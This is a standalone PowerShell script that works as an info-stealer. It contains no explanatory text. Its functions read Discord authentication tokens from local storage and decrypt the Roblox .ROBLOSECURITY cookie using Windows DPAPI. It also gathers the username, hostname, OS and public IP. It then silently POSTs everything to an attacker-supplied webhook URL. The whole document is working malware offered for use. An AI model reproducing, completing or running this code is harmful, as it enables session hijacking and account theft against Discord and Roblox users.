$webhook = "https://YOUR-SERVER-URL/wh"

function Get-SystemInfo {
    $info = @{
        user = $env:USERNAME
        host = $env:COMPUTERNAME
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        ip = (Invoke-WebRequest -Uri "https://ipinfo.io/json" -UseBasicParsing | ConvertFrom-Json)
    }
    return $info
}

function Get-DiscordTokens {
    $tokens = @()
    $paths = @(
        "$env:APPDATA\Discord\Local Storage\leveldb",
        "$env:APPDATA\DiscordPTB\Local Storage\leveldb",
        "$env:APPDATA\DiscordCanary\Local Storage\leveldb"
    )
    foreach ($p in $paths) {
        if (Test-Path $p) {
            Get-ChildItem $p -Filter "*.ldb" | ForEach-Object {
                $content = Get-Content $_.FullName -Raw
                if ($content -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') {
                    $tokens += $matches[0]
                }
            }
        }
    }
    return $tokens
}

function Get-RobloxCookie {
    $path = "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat"
    if (-not (Test-Path $path)) { return $null }
    $raw = Get-Content $path -Raw
    $start = $raw.IndexOf('"CookiesData"')
    if ($start -eq -1) { return $null }
    $start = $raw.IndexOf(':', $start) + 1
    while ($raw[$start] -eq ' ' -or $raw[$start] -eq '"') { $start++ }
    $end = $start
    while ($raw[$end] -ne '"') { $end++ }
    $b64 = $raw.Substring($start, $end - $start)
    if ($b64.Length -lt 20) { return $null }
    Add-Type -AssemblyName System.Security
    $bytes = [Convert]::FromBase64String($b64.Trim())
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 0)
    $data = [System.Text.Encoding]::UTF8.GetString($decrypted)
    $i = $data.IndexOf('.ROBLOSECURITY')
    if ($i -eq -1) { return $null }
    $i += 15
    while ($data[$i] -eq "`t" -or $data[$i] -eq ' ') { $i++ }
    $s = $i
    while ($data[$i] -ne ';' -and $data[$i] -ne "`n" -and $data[$i] -ne "`r") { $i++ }
    $cookie = $data.Substring($s, $i - $s).Trim()
    if (-not $cookie.StartsWith('_|')) {
        $l = $data.IndexOf("`n", $s)
        if ($l -eq -1) { $l = $data.Length }
        $line = $data.Substring($s, $l - $s)
        $parts = $line.Split("`t")
        for ($p = $parts.Length - 1; $p -ge 0; $p--) {
            if ($parts[$p].Trim().StartsWith('_|')) {
                $cookie = $parts[$p].Trim()
                break
            }
        }
    }
    if ($cookie.StartsWith('_|')) { return $cookie }
    return $null
}

$tokens = Get-DiscordTokens
$roblox = Get-RobloxCookie
$system = Get-SystemInfo

$payload = @{
    tokens = $tokens
    roblox = $roblox
    system = $system
    timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
} | ConvertTo-Json -Depth 5

try {
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing
} catch {}
